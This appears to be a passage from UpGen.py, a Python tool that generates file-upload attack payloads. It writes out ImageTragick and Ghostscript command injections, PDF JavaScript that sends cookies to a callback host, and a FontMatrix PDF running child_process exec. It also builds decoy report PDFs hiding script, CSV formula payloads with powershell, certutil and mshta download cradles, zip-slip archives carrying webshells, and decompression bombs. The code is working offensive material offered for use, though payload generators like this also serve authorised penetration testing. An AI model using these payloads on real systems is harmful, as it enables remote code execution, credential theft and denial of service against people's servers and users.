                 b"fill 'url(https://127.0.0.1/\"|sleep 10\")'\npop graphic-context\n")
    svg = (b'<?xml version="1.0" standalone="no"?>'
           b'<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" '
           b'"http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">'
           b'<svg width="640px" height="480px" version="1.1" '
           b'xmlns="http://www.w3.org/2000/svg" '
           b'xmlns:xlink="http://www.w3.org/1999/xlink"><image xlink:href="'
           + cb.encode() + b'" x="0" y="0" height="480px" width="640px"/></svg>')
    msl = (b'<?xml version="1.0" encoding="UTF-8"?>\n<image>\n  <read filename="'
           + cb.encode() + b'"/>\n</image>\n')
    xbm_ssrf = (b"#define u_width 1\n#define u_height 1\n"
                b"static char u_bits[] = { 0x00 };\n/* " + cb.encode() + b" */\n")
    out = [
        ("imagetragick_mvg", mvg_rce, ["mvg", "svg", "jpg", "png"]),
        ("imagetragick_mvg", mvg_over, ["mvg", "jpg"]),
        ("imagetragick_sleep", mvg_sleep, ["mvg", "jpg"]),
        ("imagetragick_svg", svg, ["svg", "mvg"]),
        ("imagetragick_msl", msl, ["msl", "svg"]),
        ("imagetragick_xbm", xbm_ssrf, ["xbm"]),
        ("imagemagick_xbm_overflow", _xbm_overflow(), ["xbm"]),
    ]
    out += _ghostscript_payloads(cb)
    out += _libav_payloads(cb)
    # Image-library fingerprinting probes across formats (synced from UpMap
    # mod_fingerping): upload one, GET it back, grep the response bytes for
    # ImageMagick / IM / added date:modify to identify the re-encoder in play.
    # Lives here because it probes image processors — same semantic family as
    # the ImageMagick/Ghostscript/libav payloads above.
    out += [
        ("fingerprint", _png_text(b"Comment", b"UpMapPNG-probe"), ["png"]),
        ("fingerprint", _png_text(b"date:create", b"2020-01-01T00:00:00+00:00"), ["png"]),
        ("fingerprint", MAGIC["gif"] + b"/* UpMapGIF-probe */", ["gif"]),
        ("fingerprint", MAGIC["jpg"] + b"UpMapJPEG-probe", ["jpg"]),
    ]
    return out


def _pdf_esc(s):
    """Escape a JS string for a PDF () literal."""
    return s.replace("\\", "\\\\").replace("(", "\\(").replace(")", "\\)")


def _pdf_js_action(js):
    """Minimal /OpenAction /JavaScript PDF (corpus xssPDF-1/2 structure), synced
    from UpMap. Smaller/cleaner parser path than the corkami multi-action PDF."""
    j = _pdf_esc(js).encode()
    return (b"%PDF-1.4\n"
            b"1 0 obj<</Type/Catalog/Pages 2 0 R/OpenAction 3 0 R>>endobj\n"
            b"2 0 obj<</Type/Pages/Kids[4 0 R]/Count 1>>endobj\n"
            b"3 0 obj<</S/JavaScript/JS (" + j + b")>>endobj\n"
            b"4 0 obj<</Type/Page/Parent 2 0 R/MediaBox[0 0 612 792]>>endobj\n"
            b"trailer<</Root 1 0 R/Size 5>>\n%%EOF\n")


def _pdf_fontmatrix(expr):
    """PortSwigger FontMatrix-injection PDF-XSS (synced from UpMap): breaks out of
    the /FontMatrix array into the viewer's JS context (PDF.js/Acrobat), firing
    WITHOUT a /JavaScript action — bypasses filters that strip /JS//OpenAction-JS.
    Correct xref so strict parsers still load it."""
    inj = expr.replace("(", "\\(").replace(")", "\\)").encode()
    stream = b"BT /F1 20 Tf 50 100 Td (AbCdEf) Tj ET\n"
    objs = [
        b"<</Type/Catalog/Pages 2 0 R/OpenAction[3 0 R /Fit]>>",
        b"<</Type/Pages/Kids[3 0 R]/Count 1>>",
        b"<</Type/Page/Parent 2 0 R/MediaBox[0 0 200 200]"
        b"/Resources<</Font<</F1 4 0 R>>>>/Contents 5 0 R>>",
        b"<</Type/Font/Subtype/Type1/BaseFont/Helvetica/Encoding/WinAnsiEncoding"
        b"/FirstChar 65/LastChar 90/Widths[" + (b"500 " * 26).strip() + b"]"
        b"/FontMatrix [0.1 0 0 0.1 0 (1\\);" + inj + b"//)]>>",
        b"<</Length %d>>\nstream\n" % len(stream) + stream + b"endstream",
    ]
    out = b"%PDF-1.5\n%\xe2\xe3\xcf\xd3\n"
    offs = []
    for i, body in enumerate(objs, 1):
        offs.append(len(out))
        out += b"%d 0 obj " % i + body + b"\nendobj\n"
    xref = len(out)
    out += b"xref\n0 %d\n0000000000 65535 f \n" % (len(objs) + 1)
    for o in offs:
        out += b"%010d 00000 n \n" % o
    out += (b"trailer<</Size %d/Root 1 0 R>>\nstartxref\n%d\n%%%%EOF\n"
            % (len(objs) + 1, xref))
    return out


def _pdf_js_action_hex(js):
    """Same minimal /OpenAction JS PDF, but the /JS value is a hex <...> string
    literal instead of (...) — filter/WAF bypass (corpus coffin_injected_xss encodes
    its JS as <hexbytes>). Synced from UpMap. No ()-escaping needed for hex form."""
    h = js.encode().hex().encode()
    return (b"%PDF-1.4\n"
            b"1 0 obj<</Type/Catalog/Pages 2 0 R/OpenAction 3 0 R>>endobj\n"
            b"2 0 obj<</Type/Pages/Kids[4 0 R]/Count 1>>endobj\n"
            b"3 0 obj<</S/JavaScript/JS <" + h + b">>>endobj\n"
            b"4 0 obj<</Type/Page/Parent 2 0 R/MediaBox[0 0 612 792]>>endobj\n"
            b"trailer<</Root 1 0 R/Size 5>>\n%%EOF\n")


def _decoy_pdf(js, pages=6):
    """Real-looking multi-page PDF (drawn text per page) carrying an injected
    /OpenAction JavaScript — the PDF analogue of the steganographic SVG (corpus
    coffin_injected_xss is a genuine 8-page doc with an injected JS action). Renders
    as a normal document, defeating 'too-minimal-to-be-real' heuristics. Correct
    xref so strict parsers still load it. Synced from UpMap."""
    j = _pdf_esc(js).encode()
    page_ids = [5 + 2 * i for i in range(pages)]
    objs = [
        b"<</Type/Catalog/Pages 2 0 R/OpenAction 3 0 R>>",
        b"<</Type/Pages/Kids[" + b" ".join(b"%d 0 R" % p for p in page_ids)
        + b"]/Count %d>>" % pages,
        b"<</S/JavaScript/JS (" + j + b")>>",
        b"<</Type/Font/Subtype/Type1/BaseFont/Helvetica>>",
    ]
    for i in range(pages):
        stream = (b"BT /F1 18 Tf 72 720 Td (Quarterly Report \\055 Page %d) Tj "
                  b"0 -24 Td (Confidential. Internal use only.) Tj ET\n" % (i + 1))
        objs.append(b"<</Type/Page/Parent 2 0 R/MediaBox[0 0 612 792]"
                    b"/Resources<</Font<</F1 4 0 R>>>>/Contents %d 0 R>>"
                    % (5 + 2 * i + 1))
        objs.append(b"<</Length %d>>\nstream\n" % len(stream) + stream + b"endstream")
    out = b"%PDF-1.5\n%\xe2\xe3\xcf\xd3\n"
    offs = []
    for i, body in enumerate(objs, 1):
        offs.append(len(out))
        out += b"%d 0 obj " % i + body + b"\nendobj\n"
    xref = len(out)
    out += b"xref\n0 %d\n0000000000 65535 f \n" % (len(objs) + 1)
    for o in offs:
        out += b"%010d 00000 n \n" % o
    out += (b"trailer<</Size %d/Root 1 0 R>>\nstartxref\n%d\n%%%%EOF\n"
            % (len(objs) + 1, xref))
    return out


def gen_pdf(_lang):
    cb = _cb(PROBE)
    pb = PROBE.encode()
    oob = _cb("pdfjs/" + PROBE)
    js_pdf = (b"%PDF-1.0\n%\xbf\xf7\xa2\xfe\n1 0 obj\n<<\n"
              b"  /AA << /WC << /JS (app.alert\\(\"" + pb + b" \\(Close\\)\"\\);)"
              b" /S /JavaScript >> >>\n"
              b"  /OpenAction << /JS (app.alert\\(\"" + pb + b" \\(Open\\)\"\\);)"
              b" /S /JavaScript >>\n  /Pages 2 0 R\n>>\nendobj\n"
              b"2 0 obj\n<< /Count 1 /Kids [3 0 R] >>\nendobj\n"
              b"3 0 obj\n<< /AA << /O << /JS (app.alert\\(\"" + pb + b" \\(AA\\)\"\\);)"
              b" /S /JavaScript >> >> /Parent 2 0 R >>\nendobj\n"
              b"trailer << /Root 1 0 R /Size 4 >>\n%%EOF\n")
    uri_ssrf = (b"%PDF-1.4\n1 0 obj\n<< /Type /Catalog /OpenAction 2 0 R /Pages 3 0 R"
                b" >>\nendobj\n2 0 obj\n<< /Type /Action /S /URI /URI (" + cb.encode()
                + b") >>\nendobj\n3 0 obj\n<< /Type /Pages /Kids [4 0 R] /Count 1 >>\n"
                b"endobj\n4 0 obj\n<< /Type /Page /Parent 3 0 R /MediaBox "
                b"[0 0 612 792] >>\nendobj\ntrailer\n<< /Size 5 /Root 1 0 R >>\n%%EOF\n")
    gs_pdf = (b"%PDF-1.4 %!PS-Adobe-3.0\n/OutputFile (%pipe%curl " + cb.encode()
              + b") currentdevice\nputdeviceprops\n")
    return [
        ("pdf_js", js_pdf, ["pdf"]),
        ("pdf_ssrf", uri_ssrf, ["pdf"]),
        ("pdf_ghostscript", gs_pdf, ["pdf", "eps"]),
        # JS-action exfil (corpus xssPDF/coffin): cookie/domain disclosure + OAST OOB.
        ("pdf_js_cookie", _pdf_js_action("app.alert(document.cookie);"), ["pdf"]),
        ("pdf_js_domain", _pdf_js_action("app.alert(document.domain);"), ["pdf"]),
        ("pdf_js_oob",
         _pdf_js_action(f'app.launchURL("{oob}?c="+escape(document.cookie),true);'), ["pdf"]),
        ("pdf_js_submitform",
         _pdf_js_action(f'this.submitForm({{cURL:"{oob}",cSubmitAs:"HTML"}});'), ["pdf"]),
        # FontMatrix-injection PDF-XSS (no /JavaScript action — bypasses /JS filters).
        ("pdf_fontmatrix_cookie", _pdf_fontmatrix("alert(document.cookie)"), ["pdf"]),
        ("pdf_fontmatrix_domain", _pdf_fontmatrix("alert(document.domain)"), ["pdf"]),
        # FontMatrix prompt() sink rotation (corpus *_cookieprompt).
        ("pdf_fontmatrix_prompt", _pdf_fontmatrix("prompt(document.cookie)"), ["pdf"]),
        ("pdf_fontmatrix_oob",
         _pdf_fontmatrix(f'app.launchURL("{oob}?fm="+escape(document.cookie))'), ["pdf"]),
        # FontMatrix -> Node/Electron RCE via require('child_process') (corpus
        # calculatorRCE.pdf): fires in Electron/Node-integrated pdf.js viewers.
        ("pdf_fontmatrix_rce",
         _pdf_fontmatrix(f"require('child_process').exec('curl {cb}')"), ["pdf"]),
        # Hex-encoded /JS <...> string form (filter bypass; corpus coffin_injected_xss).
        ("pdf_js_hex_cookie", _pdf_js_action_hex("app.alert(document.cookie);"), ["pdf"]),
        ("pdf_js_hex_domain", _pdf_js_action_hex("app.alert(document.domain);"), ["pdf"]),
        # Real-document carrier: JS action injected into a believable multi-page PDF
        # so it renders as a normal document (corpus coffin_injected_xss disguise).
        ("pdf_decoy_carrier", _decoy_pdf(f'app.alert("{PROBE}");'), ["pdf"]),
        ("pdf_decoy_cookie", _decoy_pdf("app.alert(document.cookie);"), ["pdf"]),
    ]


def gen_csv(_lang):
    cb = _cb(PROBE)
    host = OAST.split("://")[-1]
    # Formula sinks + carriers (from csv-injection-payload-list). New vs before:
    # =IMPORTFEED / =HYPERLINK file:// exe / =EXEC / =SYSTEM (LibreOffice) /
    # =IF / =IFERROR / =CONCATENATE carriers / =MSEXCEL path-traversal DDE.
    formulas = [
        "=cmd|' /C curl " + cb + "'!A0",
        "=cmd|' /C nslookup " + PROBE + "." + host + "'!A0",
        '=DDE("cmd","/C curl ' + cb + '","__DdeLink")',
        "@SUM(1+1)*cmd|' /C calc'!A0",
        "+cmd|' /C calc'!A0",
        "-cmd|' /C calc'!A0",
        '=HYPERLINK("' + cb + '","ClickMe")',
        '=HYPERLINK("file://' + _lfi("/C:/Windows/System32/calc.exe") + '","Click")',
        '=IMPORTDATA("' + cb + '")',
        '=IMPORTFEED("' + cb + '")',
        '=WEBSERVICE("' + cb + '")',
        '=EXEC("calc")',
        '=SYSTEM("calc")',
        "=IF(1=1,cmd|'/c calc'!A1,\"false\")",
        "=IFERROR(cmd|'/c calc'!A1,\"error\")",
        "=CONCATENATE(cmd|'/c calc'!A1)",
        "=MSEXCEL|'\\..\\..\\..\\Windows\\System32\\cmd.exe /c calc'!A1",
    ]
    rows = "id,name,value\n" + "\n".join(
        f'{i},"{f}",test' for i, f in enumerate(formulas, 1))

    # LOLBin download/exec cradles (powershell IEX / certutil / bitsadmin / mshta /
    # regsvr32 squiblydoo / rundll32 UNC). RFC4180-escaped so commas/quotes survive.
    cradles = [
        "=cmd|'/C powershell IEX(New-Object Net.WebClient).DownloadString(\"" + cb + "\")'!A0",
        "=cmd|'/c certutil -urlcache -split -f " + cb + " p.exe'!A0",
        "=cmd|'/c bitsadmin /transfer j " + cb + " C:\\t\\p.exe'!A0",
        "=cmd|'/c mshta " + cb + "'!A0",
        "=cmd|'/c regsvr32 /s /n /u /i:" + cb + " scrobj.dll'!A0",
        "=cmd|'/c rundll32.exe \\\\" + host + "\\s\\1.dll,0'!_xlbgnm.A1",
    ]
    def _cell(s):
        return '"' + s.replace('"', '""') + '"'
    lolbin = ("id,name,value\n" + "\n".join(
        f'{i},{_cell(c)},x' for i, c in enumerate(cradles, 1))).encode()

    # Prefix filter-bypass: a leading TAB / space / apostrophe sneaks the formula
    # past sanitizers that only inspect the first char (=,+,-,@) before eval.
    bypass_cells = ["\t=cmd|'/c calc'!A1", " =cmd|'/c calc'!A1", "'=cmd|'/c calc'!A1"]
    bypass = ("id,value\n" + "\n".join(
        f'{i},{_cell(c)}' for i, c in enumerate(bypass_cells, 1))).encode()

    oo_dde = ('id;name;value\n1;=DDE("cmd";"/C curl ' + cb
              + '";"__DdeLink_60");test\n').encode()
    iqy = ("WEB\n1\n" + cb + "\nSelection=EntirePage\nFormatting=None\n").encode()
    desktop_ini = ("[.ShellClassInfo]\nIconResource=\\\\" + host + "\\" + PROBE
                   + "\\i.ico,0\n").encode()
    autorun = ("[AutoRun]\nopen=\\\\" + host + "\\" + PROBE
               + "\\launch.exe\n").encode()
    return [("csv", rows.encode(), ["csv", "xls"]),
            ("csv_lolbin", lolbin, ["csv", "xls"]),
            ("csv_bypass", bypass, ["csv"]),
            ("csv_dde", oo_dde, ["csv"]),
            ("csv_iqy", iqy, ["iqy"]),
            ("desktop_ini", desktop_ini, ["ini"]),
            ("autorun", autorun, ["inf"])]


def gen_zip(lang):
    sh = shells_for(lang)[0][0]
    out = [("zip", _zip("shell.php", sh), ["zip", "jar", "war"])]
    # Zip-slip via traversal member names (synced from UpMap mod_zip_traversal):
    # plain ../, absolute web-root path, backslash (Windows extractors), and the
    # ....// dot-slash filter-bypass form.
    for member in ("../../../shell.php",
                   "../../../var/www/html/shell.php",
                   "..\\..\\..\\shell.php",
                   "....//....//..../shell.php"):
        out.append(("zip_slip", _zip(member, sh), ["zip", "jar"]))
    return out


def gen_fuzz(_lang):
    out = []
    for i, fz in enumerate(FUZZ):
        out.append(("fuzz", fz.encode("latin-1", "replace"), ["txt"]))
    for i in range(5):
        rnd = bytes(random.randint(0, 255) for _ in range(random.randint(64, 256)))
        out.append(("fuzz_random", rnd, ["bin"]))
    # DoS / crash files
    tiff_bomb = (b"II*\x00\x08\x00\x00\x00\x01\x00"          # IFD loop
                 b"\x00\x01\x04\x00\x01\x00\x00\x00\x08\x00\x00\x00\x00\x00\x00\x00")
    ihdr = b"\xff\xff\xff\xff\xff\xff\xff\xff\x08\x02\x00\x00\x00"  # 4G x 4G pixels
    png_bomb = (b"\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR" + ihdr
                + struct.pack(">I", zlib.crc32(b"IHDR" + ihdr) & 0xffffffff)
                + b"\x00\x00\x00\x00IEND"
                + struct.pack(">I", zlib.crc32(b"IEND") & 0xffffffff))
    riff_hang = b"RIFF" + struct.pack("<I", 0xFFFFFFFF) + b"WAVE"
    out.append(("fuzz_dos", tiff_bomb, ["tif"]))
    out.append(("fuzz_dos", png_bomb, ["png"]))
    out.append(("fuzz_dos", riff_hang, ["wav"]))
    return out


# group key -> (display label, generator)
GENERATORS = {
    "bypass":   ("Bypass / Evasion",            gen_bypass),
    "filename": ("Filename / Path Injection",   gen_filename),
    "config":   ("Config / Handler Abuse",      gen_config),
    "rce":      ("RCE / Code Execution",        gen_rce),
    "xxe":      ("XXE",                          gen_xxe),
    "xss":      ("XSS",                          gen_xss),
    "ssrf":     ("SSRF",                         gen_ssrf),
    "esi":      ("ESI",                          gen_esi),
    "images":   ("Image / Media CVEs",           gen_images),
    "pdf":      ("PDF",                          gen_pdf),
    "csv":      ("CSV",                          gen_csv),
    "zip":      ("Archive / ZIP",                gen_zip),
    "fuzz":     ("Fuzzing / DoS",                gen_fuzz),
}

ALL_LANGS = ["php", "asp", "jsp", "coldfusion", "perl"]
LANG_DEPENDENT = {"rce", "bypass", "filename"}    # use per-language shells/exts

# ─────────────────────────────────────────────────────────────────────────────
# DRIVER
# ─────────────────────────────────────────────────────────────────────────────
def generate(keys, extension, out_dir, handle):
    ext_counter = {}                  # ext folder -> running id
    seen = set()                      # (label, ext, sha1) byte-dedup
    written = 0
    skipped = 0

    for key in keys:
        _label, gen = GENERATORS[key]
        if key in LANG_DEPENDENT:
            langs = [extension] if extension else ALL_LANGS
        else:
            langs = [None]            # language-agnostic: generate once

        produced = 0
        for lang in langs:
            for label, content, exts in gen(lang):
                if not content:
                    continue
                h = hashlib.sha1(content).hexdigest()
                for ext in exts:
                    ext = ext.lower()
                    dkey = (label, ext, h)
                    if dkey in seen:
                        skipped += 1
                        continue
                    seen.add(dkey)
                    folder = os.path.join(out_dir, ext)
                    os.makedirs(folder, exist_ok=True)
                    cid = ext_counter.get(ext, 0) + 1
                    ext_counter[ext] = cid
                    name = (f"{cid:04d}_{label}_{handle}.{ext}" if handle
                            else f"{cid:04d}_{label}.{ext}")
                    with open(os.path.join(folder, name), "wb") as f:
                        f.write(content)
                    written += 1
                    produced += 1
        print(f"  {G}[+]{RS} {C}{key}{RS}: {produced} file(s)")

    return written, skipped, ext_counter


def build_parser():
    keys = ", ".join(GENERATORS)
    p = argparse.ArgumentParser(
        prog="UpGen.py",
        formatter_class=argparse.RawTextHelpFormatter,
        description="Generate upload-attack payload files to disk (standalone).",
        epilog=f"attack types: {keys}, all")
    p.add_argument("types", nargs="*", metavar="TYPE",
                   help="attack type(s) to generate, or 'all'. (required)")
    p.add_argument("-l", "--list", dest="list_generators", action="store_true",
                   help="List every attack type with its description and exit.")
    p.add_argument("-E", "--extension", default=None,
                   help="backend language (php/asp/jsp/coldfusion/perl). "
                        "Omit to generate all languages for code-exec types.")
    p.add_argument("-o", "--output", default="UpGen_out",
                   help="output directory (default: UpGen_out)")
    p.add_argument("--handle", default=HANDLE_DEFAULT,
                   help=f"handle embedded in each filename (default: {HANDLE_DEFAULT}). "
                        "Pass empty string to omit.")
    p.add_argument("--oast", default=None, metavar="HOST",
                   help="OOB callback host/URL embedded in xxe_oob / ssrf / esi "
                        f"payloads (default placeholder: {OAST}).")
    p.add_argument("--shell", action="append", default=None, metavar="[LANG=]PATH",
                   help="Custom raw shell file used instead of the built-in shells for\n"
                        "code-exec types (rce/bypass/filename/zip). Repeatable. Forms:\n"
                        "  --shell s.php            (applies to -E language, else php)\n"
                        "  --shell asp=s.asp        (per language)\n"
                        "LANG = php/asp/jsp/coldfusion/perl.")
    p.add_argument("--cmd-param", dest="cmd_param", default="cmd", metavar="NAME",
                   help="Command parameter the built-in shells read from (default: cmd).")
    p.add_argument("--allowed", default=None, metavar="EXT",
                   help="Accepted file type to mimic in bypass payloads (e.g. jpg, png, "
                        "pdf). Focuses magic-byte spoofing on that type; default tries "
                        f"all of: {', '.join(SPOOF_MAGICS)}.")
    p.add_argument("--file-read", dest="file_read", default=None, metavar="PATH",
                   help="Override the local-file target in every LFI payload (XXE "
                        "file://, php://filter, netdoc:, xi:include, xslt document(), "
                        "esi:include, ssi #include, ssrf file://, csv HYPERLINK file://, "
                        "ghostscript .libfile). Accepts a literal path "
                        "(/proc/self/environ, /c:/inetpub/wwwroot/web.config) OR an "
                        "@key.path lookup into the embedded paths.json registry "
                        "(e.g. @linux.credentials, @windows.iis, @devops_cloud.aws). "
                        "When @key resolves to multiple leaves the FIRST wins; for "
                        "wordlist-style fan-out across a whole category use "
                        "Upname instead. Unset = each payload keeps its "
                        "hardcoded default (/etc/passwd, win.ini, /etc/hostname, ...). "
                        "DoS payloads are not affected.")
    return p


def load_custom_shells(specs, default_lang):
    """--shell specs -> {lang: raw_bytes}. Exits on bad language / missing file."""
    out = {}
    for spec in specs or []:
        if "=" in spec and not os.path.isfile(spec):
            lang, _, path = spec.partition("=")
            key = SHELL_LANG_KEYS.get(lang.strip().lower())
            if not key:
                sys.exit(f"  {R}[-]{RS} --shell: unknown language '{lang.strip()}' "
                         "(php/asp/jsp/coldfusion/perl)")
        else:
            path, key = spec, default_lang
        if not os.path.isfile(path):
            sys.exit(f"  {R}[-]{RS} --shell: file not found: {path}")
        with open(path, "rb") as f:
            out[key] = f.read()
    return out


def main():
    parser = build_parser()
    opts = parser.parse_args()

    if opts.list_generators:
        banner()
        total = len(GENERATORS)
        divider = f"  {C}{'─' * 60}{RS}"
        print(f"  {W}{BLD}ATTACK TYPES  {DG}({total} generators){RS}")
        print(divider)
        for i, (k, (label, _fn)) in enumerate(GENERATORS.items(), 1):
            print(f"  {DG}  {i:2d}.{RS}  {C}{k:12s}{RS}  {label}")
        print(f"\n{divider}\n")
        sys.exit(0)

    if not opts.types:
        parser.error("specify at least one attack type (or 'all'). "
                     f"choices: {', '.join(GENERATORS)}, all")

    if "all" in [t.lower() for t in opts.types]:
        keys = list(GENERATORS)
    else:
        keys, bad = [], []
        for t in opts.types:
            t = t.lower()
            (keys if t in GENERATORS else bad).append(t)
        if bad:
            parser.error(f"unknown attack type(s): {', '.join(bad)}. "
                         f"choices: {', '.join(GENERATORS)}, all")
        keys = list(dict.fromkeys(keys))

    if opts.extension and opts.extension.lower() not in ALL_LANGS:
        parser.error(f"-E must be one of: {', '.join(ALL_LANGS)}")

    # C3: refuse a directory --file-read (literal or @key resolving to a dir).
    # Multi-leaf @key results are already dir-filtered by the resolver.
    _validate_file_read_or_die(opts.file_read, parser.error)

    global OAST, CMD_PARAM, CUSTOM_SHELLS, ALLOWED, FILE_READ
    if opts.oast:
        OAST = opts.oast
    CMD_PARAM = opts.cmd_param
    ALLOWED = opts.allowed.lower().lstrip(".") if opts.allowed else None
    FILE_READ = opts.file_read if opts.file_read else None
    default_lang = opts.extension.lower() if opts.extension else "php"
    CUSTOM_SHELLS = load_custom_shells(opts.shell, default_lang)

    banner()
    print(f"  {W}{BLD}generating{RS} {C}{', '.join(keys)}{RS}  "
          f"(ext={opts.extension or 'all-langs'}, handle={opts.handle or '-'})")
    if opts.oast:
        print(f"  {DG}oast={RS}{opts.oast}")
    if CMD_PARAM != "cmd":
        print(f"  {DG}cmd-param={RS}{CMD_PARAM}")
    if ALLOWED:
        print(f"  {DG}allowed (spoof target)={RS}{ALLOWED}")
    if CUSTOM_SHELLS:
        print(f"  {DG}custom shells:{RS} " +
              ", ".join(f"{k}={len(v)}b" for k, v in CUSTOM_SHELLS.items()))
    print()

    written, skipped, ext_counter = generate(
        keys, opts.extension.lower() if opts.extension else None,
        opts.output, opts.handle)

    print(f"\n  {G}{BLD}Done.{RS}  {W}{written}{RS} files in "
          f"{W}{len(ext_counter)}{RS} folder(s) under {C}{opts.output}/{RS}  "
          f"{DG}({skipped} duplicate payloads skipped){RS}")
    for ext, n in sorted(ext_counter.items(), key=lambda kv: -kv[1]):
        print(f"    {DG}{opts.output}/{ext}/{RS}  {W}{n}{RS}")
    print()


if __name__ == "__main__":
    main()
